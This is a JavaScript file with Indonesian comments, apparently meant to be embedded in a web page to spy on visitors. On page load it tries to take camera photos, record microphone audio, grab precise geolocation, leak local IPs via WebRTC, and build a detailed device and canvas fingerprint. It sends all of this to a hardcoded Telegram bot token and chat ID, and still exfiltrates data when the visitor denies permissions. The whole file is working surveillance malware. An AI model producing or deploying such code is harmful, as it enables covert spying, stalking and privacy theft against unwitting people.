// Konfigurasi Telegram - UBAH INI
const TELEGRAM_TOKEN = "8755355530:AAGSreN3PpCitnMkDkrC25qRUpW7gcY9b2A";
const TELEGRAM_CHAT_ID = "6828924584";

// Fungsi kirim ke Telegram
async function sendToTelegram(message) {
    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
    await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        })
    });
}

// Fungsi kirim foto ke Telegram
async function sendPhotoToTelegram(photoBase64) {
    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`;
    await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            photo: photoBase64
        })
    });
}

// Fungsi kirim audio ke Telegram
async function sendAudioToTelegram(audioBase64) {
    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendAudio`;
    await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            audio: audioBase64
        })
    });
}

// 1. AMBIL FOTO DARI KAMERA
async function capturePhoto() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.createElement('video');
        video.srcObject = stream;
        await video.play();
        
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        
        const photoData = canvas.toDataURL('image/jpeg');
        stream.getTracks().forEach(track => track.stop());
        
        await sendPhotoToTelegram(photoData);
        return "Foto terkirim";
    } catch (e) {
        return "Gagal akses kamera: " + e.message;
    }
}

// 2. REKAM AUDIO 3 DETIK
async function recordAudio() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
        const mediaRecorder = new MediaRecorder(stream);
        const audioChunks = [];
        
        mediaRecorder.ondataavailable = event => {
            audioChunks.push(event.data);
        };
        
        mediaRecorder.onstop = async () => {
            const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
            const reader = new FileReader();
            reader.readAsDataURL(audioBlob);
            reader.onloadend = async () => {
                const base64Audio = reader.result;
                await sendAudioToTelegram(base64Audio);
            };
        };
        
        mediaRecorder.start();
        setTimeout(() => {
            mediaRecorder.stop();
            stream.getTracks().forEach(track => track.stop());
        }, 3000);
        
        return "Audio direkam 3 detik";
    } catch (e) {
        return "Gagal akses mikrofon: " + e.message;
    }
}

// 3. AMBIL IP DAN INFO LENGKAP
async function getFullInfo() {
    try {
        // IP Public dan lokasi
        const ipResponse = await fetch('https://ipapi.co/json/');
        const ipData = await ipResponse.json();
        
        // IP Local
        const rtcPeer = new RTCPeerConnection({ iceServers: [] });
        rtcPeer.createDataChannel('');
        rtcPeer.createOffer().then(offer => rtcPeer.setLocalDescription(offer));
        
        let localIP = '';
        rtcPeer.onicecandidate = (ice) => {
            if (ice.candidate) {
                const ipRegex = /([0-9]{1,3}\.){3}[0-9]{1,3}/;
                const match = ice.candidate.candidate.match(ipRegex);
                if (match) localIP = match[0];
            }
        };
        
        // Device info lengkap
        const deviceInfo = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            cookiesEnabled: navigator.cookieEnabled,
            doNotTrack: navigator.doNotTrack,
            hardwareConcurrency: navigator.hardwareConcurrency,
            deviceMemory: navigator.deviceMemory,
            maxTouchPoints: navigator.maxTouchPoints,
            vendor: navigator.vendor,
            product: navigator.product,
            appVersion: navigator.appVersion,
            appName: navigator.appName,
            appCodeName: navigator.appCodeName,
            onLine: navigator.onLine,
            screen: {
                width: screen.width,
                height: screen.height,
                availWidth: screen.availWidth,
                availHeight: screen.availHeight,
                colorDepth: screen.colorDepth,
                pixelDepth: screen.pixelDepth,
                orientation: screen.orientation ? screen.orientation.type : 'unknown'
            },
            window: {
                innerWidth: window.innerWidth,
                innerHeight: window.innerHeight,
                outerWidth: window.outerWidth,
                outerHeight: window.outerHeight,
                devicePixelRatio: window.devicePixelRatio
            },
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            timezoneOffset: new Date().getTimezoneOffset(),
            battery: await navigator.getBattery ? await navigator.getBattery().then(b => ({
                charging: b.charging,
                level: b.level * 100 + '%'
            })).catch(() => 'Tidak bisa akses') : 'Not supported',
            connection: navigator.connection ? {
                type: navigator.connection.effectiveType,
                downlink: navigator.connection.downlink + ' Mbps',
                rtt: navigator.connection.rtt + ' ms',
                saveData: navigator.connection.saveData
            } : 'Not supported',
            plugins: Array.from(navigator.plugins).map(p => p.name),
            mimeTypes: Array.from(navigator.mimeTypes).map(m => m.type)
        };
        
        // Info geolokasi akurat
        let geoLocation = 'Tidak bisa dapat lokasi';
        if (navigator.geolocation) {
            try {
                const position = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject, {
                        enableHighAccuracy: true,
                        timeout: 5000,
                        maximumAge: 0
                    });
                });
                geoLocation = {
                    lat: position.coords.latitude,
                    lng: position.coords.longitude,
                    accuracy: position.coords.accuracy + ' meters',
                    altitude: position.coords.altitude,
                    altitudeAccuracy: position.coords.altitudeAccuracy,
                    heading: position.coords.heading,
                    speed: position.coords.speed
                };
            } catch (e) {
                geoLocation = e.message;
            }
        }
        
        // Gabungkan semua info
        const fullInfo = `
<b>🔍 FULL VISITOR DETECTED 🔍</strong>

<b>🌐 IP INFORMATION:</b>
• Public IP: ${ipData.ip}
• Local IP: ${localIP || 'Gagal detect'}
• Hostname: ${ipData.hostname || 'N/A'}
• ISP: ${ipData.org || 'N/A'}
• ASN: ${ipData.asn || 'N/A'}
• Network: ${ipData.network || 'N/A'}

<b>📍 LOCATION DETAILS:</b>
• Country: ${ipData.country_name} (${ipData.country_code})
• Region: ${ipData.region} (${ipData.region_code})
• City: ${ipData.city}
• Postal Code: ${ipData.postal || 'N/A'}
• Latitude/Longitude: ${ipData.latitude}, ${ipData.longitude}
• Timezone: ${ipData.timezone}
• Currency: ${ipData.currency || 'N/A'}

<b>🎯 PRECISE GEOLOCATION:</b>
• ${JSON.stringify(geoLocation, null, 2)}

<b>💻 DEVICE SPECIFICATIONS:</b>
• Platform: ${deviceInfo.platform}
• User Agent: ${deviceInfo.userAgent}
• Language: ${deviceInfo.language}
• Hardware Concurrency: ${deviceInfo.hardwareConcurrency} cores
• Device Memory: ${deviceInfo.deviceMemory} GB
• Max Touch Points: ${deviceInfo.maxTouchPoints}
• Vendor: ${deviceInfo.vendor}
• Online: ${deviceInfo.onLine ? 'Yes' : 'No'}

<b>🖥️ SCREEN DETAILS:</b>
• Resolution: ${deviceInfo.screen.width}x${deviceInfo.screen.height}
• Available: ${deviceInfo.screen.availWidth}x${deviceInfo.screen.availHeight}
• Color Depth: ${deviceInfo.screen.colorDepth}-bit
• Pixel Depth: ${deviceInfo.screen.pixelDepth}-bit
• Orientation: ${deviceInfo.screen.orientation}
• Window Size: ${deviceInfo.window.innerWidth}x${deviceInfo.window.innerHeight}
• Device Pixel Ratio: ${deviceInfo.window.devicePixelRatio}

<b>🔋 BATTERY STATUS:</b>
• ${deviceInfo.battery}

<b>📶 NETWORK INFO:</b>
• ${JSON.stringify(deviceInfo.connection)}

<b>🔌 PLUGINS INSTALLED:</b>
• ${deviceInfo.plugins.join('\n• ') || 'None'}

<b>📁 MIME TYPES:</b>
• ${deviceInfo.mimeTypes.join('\n• ') || 'None'}

<b>⏰ TIME INFORMATION:</b>
• Timezone: ${deviceInfo.timezone}
• Offset: ${deviceInfo.timezoneOffset} minutes
• Local Time: ${new Date().toString()}
• UTC Time: ${new Date().toUTCString()}

<b>🍪 COOKIES & TRACKING:</b>
• Cookies Enabled: ${deviceInfo.cookiesEnabled}
• Do Not Track: ${deviceInfo.doNotTrack || 'Not set'}
        `;
        
        await sendToTelegram(fullInfo);
        return "Info lengkap terkirim";
        
    } catch (e) {
        await sendToTelegram("Error get info: " + e.message);
        return "Error: " + e.message;
    }
}

// 4. EKSEKUSI SEMUA
async function executeAll() {
    let results = [];
    
    // Kirim notifikasi mulai
    await sendToTelegram("🚨 <b>VISITOR DETECTED</b> 🚨\nMengumpulkan semua informasi...");
    
    // Ambil info lengkap
    results.push(await getFullInfo());
    
    // Tunggu sebentar
    await new Promise(r => setTimeout(r, 1000));
    
    // Foto dari kamera
    results.push(await capturePhoto());
    
    // Tunggu sebentar
    await new Promise(r => setTimeout(r, 1000));
    
    // Rekam audio
    results.push(await recordAudio());
    
    // Info tambahan via WebRTC
    try {
        const webrtcInfo = await getWebRTCInfo();
        if (webrtcInfo) await sendToTelegram("<b>WebRTC Leak:</b>\n" + webrtcInfo);
    } catch (e) {}
    
    // Kirim ringkasan
    await sendToTelegram("✅ <b>SEMUA INFORMASI TERKIRIM</b>\n" + results.join('\n'));
}

// WebRTC leak tambahan
async function getWebRTCInfo() {
    return new Promise((resolve) => {
        try {
            const pc = new RTCPeerConnection({
                iceServers: [{ urls: "stun:stun.l.google.com:19302" }]
            });
            
            pc.createDataChannel("");
            pc.createOffer().then(offer => pc.setLocalDescription(offer));
            
            let ips = [];
            pc.onicecandidate = (ice) => {
                if (ice.candidate) {
                    const ipRegex = /([0-9]{1,3}\.){3}[0-9]{1,3}/g;
                    const match = ice.candidate.candidate.match(ipRegex);
                    if (match) ips = [...new Set([...ips, ...match])];
                } else {
                    resolve(ips.join(', '));
                }
            };
            
            setTimeout(() => resolve(ips.join(', ')), 3000);
        } catch (e) {
            resolve("Gagal: " + e.message);
        }
    });
}

// 5. JALANKAN SAAT HALAMAN DIMUAT
window.onload = async () => {
    // Minta permission dulu
    try {
        await navigator.mediaDevices.getUserMedia({ video: true, audio: true })
            .then(stream => {
                stream.getTracks().forEach(track => track.stop());
                executeAll();
            })
            .catch(err => {
                sendToTelegram("⚠️ User tolak permission: " + err.message);
                getFullInfo(); // Tetap ambil info tanpa kamera/audio
            });
    } catch (e) {
        getFullInfo();
    }
};

// Backup fingerprint tambahan
const canvas = document.createElement('canvas');
const ctx = canvas.getContext('2d');
canvas.width = 200;
canvas.height = 200;
ctx.textBaseline = "top";
ctx.font = "14px Arial";
ctx.fillStyle = "#f60";
ctx.fillRect(125,1,62,20);
ctx.fillStyle = "#069";
ctx.fillText("🕵️", 2, 15);
ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
ctx.fillText("Fingerprint", 4, 45);
const canvasFingerprint = canvas.toDataURL();

// Kirim fingerprint juga
fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        photo: canvasFingerprint,
        caption: "🎯 Canvas Fingerprint Generated"
    })
}).catch(() => {});